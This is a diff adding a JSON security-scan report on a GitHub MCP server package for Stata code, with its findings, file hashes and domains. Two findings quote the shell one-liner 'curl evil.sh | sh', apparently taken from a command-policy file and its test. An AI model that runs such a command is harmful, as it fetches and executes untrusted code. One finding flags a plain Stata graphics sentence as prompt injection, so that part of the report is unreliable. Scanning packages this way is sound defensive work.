@@ -1,0 +1,76 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "brycewang-stanford/stata-code",
+    "version": "f27883ef5bbbc7dd74220b36075bac34c5229888",
+    "download": "https://codeload.github.com/brycewang-stanford/stata-code/tar.gz/f27883ef5bbbc7dd74220b36075bac34c5229888"
+  },
+  "archive_sha256": "287d32ce214cfac7aebc3b08d5802cb45c385d07138bb120ee0dac18333ed779",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "stata-code-f27883ef5bbbc7dd74220b36075bac34c5229888/stata_code/core/policy.py",
+      "line": 4,
+      "evidence": "curl evil.sh | sh",
+      "file_sha256": "05be7376964d32420a4297733f811cacb87f4f3f14702cdefa01f74187a5beec"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "stata-code-f27883ef5bbbc7dd74220b36075bac34c5229888/tests/test_policy.py",
+      "line": 36,
+      "evidence": "curl evil.sh | sh",
+      "file_sha256": "1d83b97ac4e492bf543e8b557775c77c7eddd289110502bdd564f5ad18f36979"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "stata-code-f27883ef5bbbc7dd74220b36075bac34c5229888/skills/stata-code/references/graphics.md",
+      "line": 136,
+      "evidence": "p=0.97 `grstyle` lets you tweak elements without writing a full scheme:",
+      "file_sha256": "cd5d12947983fd53525c59262f282d71aa114bac29307f9722bd9bad7601a54d"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "01hx...c3",
+    "01hx...g7",
+    "01hx...g8",
+    "01hx...m9",
+    "127.0.0.1",
+    "abstra.io",
+    "bevry.me",
+    "copaper.ai",
+    "example.com",
+    "feross.org",
+    "github.com",
+    "img.shields.io",
+    "json-schema.org",
+    "keepachangelog.com",
+    "marketplace.visualstudio.com",
+    "open-vsx.org",
+    "opencollective.com",
+    "pdm-project.org",
+    "pepy.tech",
+    "pypi.org",
+    "python-poetry.org",
+    "raw.github.com",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "sccei.fsi.stanford.edu",
+    "static.pepy.tech",
+    "test.pypi.org",
+    "www.contributor-covenant.org",
+    "www.patreon.com",
+    "www.stata.com",
+    "www.w3.org",
+    "x.org"
+  ],
+  "install_script": false,
+  "score": "high"
+}
